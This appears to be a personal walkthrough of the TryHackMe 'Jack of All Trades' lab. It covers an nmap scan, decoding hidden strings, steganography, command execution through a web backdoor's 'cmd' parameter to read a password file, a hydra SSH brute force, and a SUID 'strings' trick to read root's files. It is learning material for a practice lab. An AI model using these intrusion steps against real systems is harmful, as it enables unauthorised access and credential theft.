## Link to tryhackme room

[jack of all trades](https://tryhackme.com/room/jackofalltrades)

## Save target IP to a variable (NOTE: Your IP will be different)

`export target="10.10.247.27"`

## Scan for open ports

nmap options explained:    

- -Pn: Do not ping host(Assume it is alive)  
- -p-: Scan all TCP ports(1-65535)  
- -sS: SYN scan; Do not complete the TCP 3-Way handshake, only send SYN packet  
- -T4: Agressive scan  

`sudo nmap -Pn -p- -sS -T4 ${target}`  

## Enumerate open ports

nmap options explained:  

- -Pn: Do not ping host(Assume it is alive)  
- -p:  List of ports to scan  
- -sC: Run **C**ommand scripts against the selected ports  
- -sV: Display service **V**ersion  
- -oA: Save scan results in **A**ll formats(nmap, xml, greppable)  

`nmap -Pn -p22,80 -sC -sV ${target} -oA ${target}`


## Nmap reports

Jack is sneeaky!  The target box is running two services:  Web server and SSH server.  However, the default ports are reversed.  The web server is runing on tcp port 22 and the ssh server is running on tcp port 80.  

```
Host is up (0.086s latency).

PORT   STATE SERVICE VERSION
**22/tcp open  http    Apache httpd 2.4.10 ((Debian))**
|_http-title: Jack-of-all-trades!
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
|_http-server-header: Apache/2.4.10 (Debian)
**80/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)**
| ssh-hostkey: 
|   1024 13:b7:f0:a1:14:e2:d3:25:40:ff:4b:94:60:c5:00:3d (DSA)
|   2048 91:0c:d6:43:d9:40:c3:88:b1:be:35:0b:bc:b9:90:88 (RSA)
|   256 a3:fb:09:fb:50:80:71:8f:93:1f:8d:43:97:1e:dc:ab (ECDSA)
|_  256 65:21:e7:4e:7c:5a:e7:bc:c6:ff:68:ca:f1:cb:75:e3 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Sep 19 22:59:56 2022 -- 1 IP address (1 host up) scanned in 43.17 seconds
```

## Remote port forwarding

I tried to access the site from my firefox browser on tcp port 22(http://10.10.247.27), but by default firefox does not allow this port to be accessed from the browser.  Instead of changing my firefox settings, I downloaded pwncat and forwarded remote port 22 locally to port 8000 so that I can access the site from my brower: http://127.0.0.1:8000 

```
┌──(edward㉿repoman)-[~/Documents/tryhackme/jackofalltrades]
└─$ pwncat -L 127.0.0.1:8000 10.10.247.27 22
```

## view-source:http://127.0.0.1:8000/index.html

I couldn't find any interesting pages when I ran `dirb` against the site so I looked at the source code of index.html.  I found a php page and an encoded string  

```
<html>
	<head>
		<title>Jack-of-all-trades!</title>
		<link href="assets/style.css" rel=stylesheet type=text/css>
	</head>
	<body>
		<img id="header" src="assets/header.jpg" width=100%>
		<h1>Welcome to Jack-of-all-trades!</h1>
		<main>
			<p>My name is Jack. I'm a toymaker by trade but I can do a little of anything -- hence the name!<br>I specialise in making children's toys (no relation to the big man in the red suit - promise!) but anything you want, feel free to get in contact and I'll see if I can help you out.</p>
			<p>My employment history includes 20 years as a penguin hunter, 5 years as a police officer and 8 months as a chef, but that's all behind me. I'm invested in other pursuits now!</p>
			<p>Please bear with me; I'm old, and at times I can be very forgetful. If you employ me you might find random notes lying around as reminders, but don't worry, I <em>always</em> clear up after myself.</p>
			<p>I love dinosaurs. I have a <em>huge</em> collection of models. Like this one:</p>
			<img src="assets/stego.jpg">
			<p>I make a lot of models myself, but I also do toys, like this one:</p>
			<img src="assets/jackinthebox.jpg">
			<!--Note to self - If I ever get locked out I can get back in at **REDACTED** -->
			<!--  **REDACTED** -->
			<p>I hope you choose to employ me. I love making new friends!</p>
			<p>Hope to see you soon!</p>
			<p id="signature">Jack</p>
		</main>
	</body>
</html>
```

## base64 decode


The encoded string looks like base64 encoding.  I decoded the string with the following command: `echo <encoded string>| base64 -d` .  This reveals a clue for decoding other artifacts later on(which I missed) and a password we'll need later


## view-source:http://127.0.0.1:8000/`REDACTED`.php

Navigating to the hidden php page found in the source of the index.html page, we find a login screen.  We don't yet have login credentials so let's check the source:  

```
		
<!DOCTYPE html>
<html>
	<head>
		<title>Recovery Page</title>
		<style>
			body{
				text-align: center;
			}
		</style>
	</head>
	<body>
		<h1>Hello Jack! Did you forget your machine password again?..</h1>	
		<form action="/**REDACTED**.php" method="POST">
			<label>Username:</label><br>
			<input name="user" type="text"><br>
			<label>Password:</label><br>
			<input name="pass" type="password"><br>
			<input type="submit" value="Submit">
		</form>
		<!-- **REDACTED**  -->
		 
	</body>
</html>
```

We find another encoded string to decode.  Thsi is where I missed the clue which would have saved me lots of time, but using (Cyber Chef)[https://cyberchef.org/] and trail-and-error, I was able to get the right combination to decode the string: `base32, hex, and then rot13`  

The decoded string gives us a clue to the credentials for the recovery page:  

```
Remember that the credentials to the recovery login are hidden on the homepage! I know how forgetful you are, so here's a hint: **REDACTED**
```

## stego.jpg is a stego file

The hint leads us to look at the three image files loaded on the homepage.  Let's download them with wget and see if we can find any hidden data in the files:  


### Red herring

Remember those credentials we found earlier?  This is where we use it!  

```
┌──(edward㉿repoman)-[~/Documents/tryhackme/jackofalltrades]
└─$ **steghide --extract --stegofile stego.jpg **
Enter passphrase:  
wrote extracted data to "creds.txt".
┌──(edward㉿repoman)-[~/Documents/tryhackme/jackofalltrades]
└─$ **cat creds.txt**                         
Hehe. Gotcha!

You're on the right path, but wrong image!
```

### Checking the other two images

```
┌──(edward㉿repoman)-[~/Documents/tryhackme/jackofalltrades]
└─$ steghide --extract --stegofile jackinthebox.jpg 
Enter passphrase: 
steghide: could not extract any data with that passphrase!
                                                                                                                                                                                                               
┌──(edward㉿repoman)-[~/Documents/tryhackme/jackofalltrades]
└─$ steghide --extract --stegofile header.jpg                                                                                                                                                              1 ⨯
Enter passphrase: 
wrote extracted data to "cms.creds".
                                                                                                                                                                                                               
┌──(edward㉿repoman)-[~/Documents/tryhackme/jackofalltrades]
└─$ cat cms.creds 
Here you go Jack. Good thing you thought ahead!

Username: **REDACTED**
Password: **REDACTED**

```

## Visit the PHP log in page 

We see this message after we log in:  

```
GET me a 'cmd' and I'll run it for you Future-Jack. 
```

submitting commands via the "cmd" parameter, we find a file with passwords:  
`http://127.0.0.1:8000/**REDACTED**/index.php?cmd=cat+/home/**REDACTED** (Captured with Burp Suite)`  

```
HTTP/1.1 200 OK
Date: Tue, 20 Sep 2022 04:39:47 GMT
Server: Apache/2.4.10 (Debian)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 476
Connection: close
Content-Type: text/html; charset=UTF-8

GET me a 'cmd' and I'll run it for you Future-Jack.  
**REDACTED**
```


## Looking for valid credentials

Let's use hydar with the discovered username and passwords to find the right credentials
```
┌──(edward㉿repoman)-[~/Documents/tryhackme/jackofalltrades]
└─$ hydra -l **<username>** -P **<password list>** ssh://10.10.247.27:80                                                                                                                                         
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-09-20 00:38:42
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 25 login tries (l:1/p:25), ~2 tries per task
[DATA] attacking ssh://10.10.247.27:80/
[80][ssh] host: 10.10.247.27   login: **REDCATED**   password: **REDACTED**
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-09-20 00:38:46

```

## Finding the root flag

Normally the next step after gaining shell access is to escalte privileges.  I'm not sure if it was possible with this box, but I just took as far as getting the root flag.  I downloaded and ran linpeas.sh and find that the "strings" binary had the SUID bit set.  I headed over to [GTFOBins](https://gtfobins.github.io/) to see how to take advantage of this vulnerability.  To take advantage of this vulnerabilty, I set a local variable equal to the file I want to read like "/root/root.txt" and pass it to the strings binary while in the directory where strings is located, Reference: [suid](https://gtfobins.github.io/gtfobins/strings/#suid)  

```
jack@jack-of-all-trades:~$ which strings
/usr/bin/strings
jack@jack-of-all-trades:~$ cd /usr/bin
jack@jack-of-all-trades:/usr/bin$ LFILE=/root/root.txt
jack@jack-of-all-trades:/usr/bin$ ./strings "$LFILE"
ToDo:
1.Get new penguin skin rug -- surely they won't miss one or two of those blasted creatures?
2.Make T-Rex model!
3.Meet up with Johny for a pint or two
4.Move the body from the garage, maybe my old buddy Bill from the force can help me hide her?
5.Remember to finish that contract for Lisa.
6.Delete this: **REDACTED**
```

